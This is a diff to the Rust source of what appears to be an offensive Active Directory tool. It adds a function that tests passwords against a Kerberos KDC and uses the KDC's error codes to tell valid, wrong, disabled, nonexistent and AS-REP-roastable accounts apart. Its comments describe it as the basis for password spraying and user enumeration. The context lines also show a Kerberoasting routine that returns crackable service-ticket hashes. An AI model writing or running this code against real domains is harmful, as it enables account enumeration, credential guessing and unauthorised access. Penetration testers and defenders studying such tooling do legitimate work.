@@ -190,6 +190,79 @@ pub async fn get_tgt(user: &str, password: &str, realm: &str, kdc: &str) -> Resu
     })
 }
 
+/// Outcome of a Kerberos pre-auth credential check (password spray / user enum).
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum CredResult {
+    Valid,          // AS-REP returned — password correct
+    ValidButExpired, // correct password, must change (KEY_EXPIRED)
+    Invalid,        // PREAUTH_FAILED — wrong password
+    Disabled,       // CLIENT_REVOKED — locked/disabled/expired account
+    NoPreAuth,      // DONT_REQ_PREAUTH — AS-REP roastable, password not verifiable this way
+    NoSuchUser,     // C_PRINCIPAL_UNKNOWN — account does not exist
+    Other(u32),
+}
+
+/// Validate one credential via a Kerberos AS pre-auth exchange (no LDAP needed). The KDC
+/// error code classifies the result — the basis for password spraying and user enumeration.
+pub async fn check_credential(user: &str, password: &str, realm: &str, kdc: &str) -> Result<CredResult> {
+    let realm = realm.to_uppercase();
+    let cipher = aes256();
+    let user = user.split('@').next().unwrap_or(user);
+    let user = user.rsplit('\\').next().unwrap_or(user);
+    let default_salt = format!("{realm}{user}");
+
+    // Step 1 — no pre-auth: classify by response.
+    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None))
+        .map_err(|e| anyhow!("encode AS-REQ#1: {e}"))?;
+    let resp1 = kdc_exchange(kdc, &raw1).await?;
+    if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
+        return Ok(CredResult::NoPreAuth); // pre-auth not required for this account
+    }
+    let salt = match picky_asn1_der::from_bytes::<KrbError>(&resp1) {
+        Ok(err) => match err.0.error_code.0 {
+            25 => extract_salt(&err, &default_salt), // PREAUTH_REQUIRED — normal
+            6 => return Ok(CredResult::NoSuchUser),
+            c => return Ok(CredResult::Other(c)),
+        },
+        Err(e) => bail!("unexpected AS response: {e}"),
+    };
+
+    // Step 2 — pre-auth with the candidate password.
+    let key = cipher
+        .generate_key_from_password(password.as_bytes(), salt.as_bytes())
+        .map_err(|e| anyhow!("derive key: {e}"))?;
+    let ts = PaEncTsEnc {
+        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
+        pausec: Optional::from(None),
+    };
+    let enc_ts = cipher
+        .encrypt(&key, PA_ENC_TIMESTAMP_KEY_USAGE, &picky_asn1_der::to_vec(&ts).unwrap())
+        .map_err(|e| anyhow!("encrypt PA-TS: {e}"))?;
+    let padata = PaData {
+        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])),
+        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
+            picky_asn1_der::to_vec(&encrypted_data(crate::ETYPE_AES256, enc_ts)).unwrap(),
+        )),
+    };
+    let raw2 = picky_asn1_der::to_vec(&build_as_req(&realm, user, Some(padata)))
+        .map_err(|e| anyhow!("encode AS-REQ#2: {e}"))?;
+    let resp2 = kdc_exchange(kdc, &raw2).await?;
+
+    if picky_asn1_der::from_bytes::<AsRep>(&resp2).is_ok() {
+        return Ok(CredResult::Valid);
+    }
+    Ok(match picky_asn1_der::from_bytes::<KrbError>(&resp2) {
+        Ok(err) => match err.0.error_code.0 {
+            24 => CredResult::Invalid,        // PREAUTH_FAILED
+            18 => CredResult::Disabled,       // CLIENT_REVOKED
+            23 => CredResult::ValidButExpired, // KEY_EXPIRED
+            6 => CredResult::NoSuchUser,
+            c => CredResult::Other(c),
+        },
+        Err(_) => CredResult::Other(0),
+    })
+}
+
 /// Build a TGS-REQ for `spn` using the TGT, and return the crackable service-ticket hash.
 pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<String> {
     let session = aes256();
